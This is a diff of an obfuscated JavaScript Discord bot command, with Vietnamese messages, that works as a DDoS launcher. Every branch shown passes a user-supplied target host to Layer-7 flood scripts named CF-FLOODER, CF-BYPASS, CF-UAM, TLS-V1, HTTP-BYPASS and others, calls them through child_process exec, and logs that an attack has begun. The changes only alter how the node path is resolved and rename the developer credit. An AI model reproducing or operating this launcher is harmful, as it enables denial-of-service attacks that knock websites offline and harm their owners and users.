@@ -93,12 +93,13 @@ module['exports'] = {
                 })['setTimestamp']()]
             })
         };
+        const pathNode = require('path').join(require('path').dirname(require('which').sync('node')), 'node');
         const _0xf396x9 = _0xf396x8['options']['getString']('methods');
         const website = _0xf396x8['options']['getString']('host');
         if (_0xf396x9 === 'VIP-KID') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js GET '}${website}${' http.txt 120 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js GET '}${website}${' http.txt 120 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -125,8 +126,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+              ['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -140,7 +141,7 @@ module['exports'] = {
             if (_0xf396x9 === 'VIP-JXE') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 10'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -167,8 +168,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+              ['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -182,7 +183,7 @@ module['exports'] = {
             if (_0xf396x9 === 'HTTP-BROWSER') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 10 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 10 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -209,8 +210,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -224,7 +225,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HOAN-V1') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js GET '}${website}${' http.txt 60 150 9 cookie="" referer="http://www.google.com/?q=" useragent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" headerdata="" randomstring="sKCx49VgtHZ59bJOTLcU0Gr06ogUnDJi"'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js GET '}${website}${' http.txt 60 150 9 cookie="" referer="http://www.google.com/?q=" useragent="Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" headerdata="" randomstring="sKCx49VgtHZ59bJOTLcU0Gr06ogUnDJi"'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -251,8 +252,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -266,7 +267,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HOAN-V2') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 120 20 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 120 20 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -293,8 +294,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -308,7 +309,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HTTP-JUBI') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -335,8 +336,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -350,7 +351,7 @@ module['exports'] = {
         if (_0xf396x9 === 'CF-FLOODER') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js GET '}${website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js GET '}${website}${' http.txt 60 120 3'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -377,8 +378,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -392,7 +393,7 @@ module['exports'] = {
         if (_0xf396x9 === 'CF-BYPASS') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 120 100 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 120 100 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -419,8 +420,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -434,7 +435,7 @@ module['exports'] = {
         if (_0xf396x9 === 'CF-TLS') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 120 10 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 120 10 http.txt'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -461,8 +462,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -476,7 +477,7 @@ module['exports'] = {
         if (_0xf396x9 === 'CF-UAM') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js GET '}${website}${' http.txt 60 64 1'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js GET '}${website}${' http.txt 60 64 1'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -503,8 +504,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -518,7 +519,7 @@ module['exports'] = {
         if (_0xf396x9 === 'TLS-V1') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 5 120 http.txt GET'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 5 120 http.txt GET'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -545,8 +546,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -560,7 +561,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HTTP-BYPASS') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -587,8 +588,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -602,7 +603,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HTTP-SAN') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 5 GET http.txt 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 5 GET http.txt 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -629,8 +630,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -644,7 +645,7 @@ module['exports'] = {
         if (_0xf396x9 === 'HTTP-ONII') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 http.txt 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -671,8 +672,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
@@ -686,7 +687,7 @@ module['exports'] = {
         if (_0xf396x9 === 'TLS-V2') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`cd vip && cd L7 && ${'node '}${method}${'.js '}${website}${' 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`cd vip && cd L7 && ${pathNode} ${method}${'.js '}${website}${' 60 120 5'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -713,8 +714,8 @@ module['exports'] = {
                 value: `${' [ VIP ] '}`,
                 inline: true
             })['setImage'](randomgif)
-['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
-            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill#4176', img)['setTimestamp']();
+['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
+            const _0xf396x11 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['setDescription']('ĐANG KIỂM TRA...')['setImage']('https://cdn.discordapp.com/attachments/1032269044952354817/1035539812331028560/LOADING.gif')['setFooter']('\xA9 Developer: overkill3101', img)['setTimestamp']();
             _0xf396x8['reply']({
                 embeds: [_0xf396x11]
             })['then']((_0xf396x12) => {
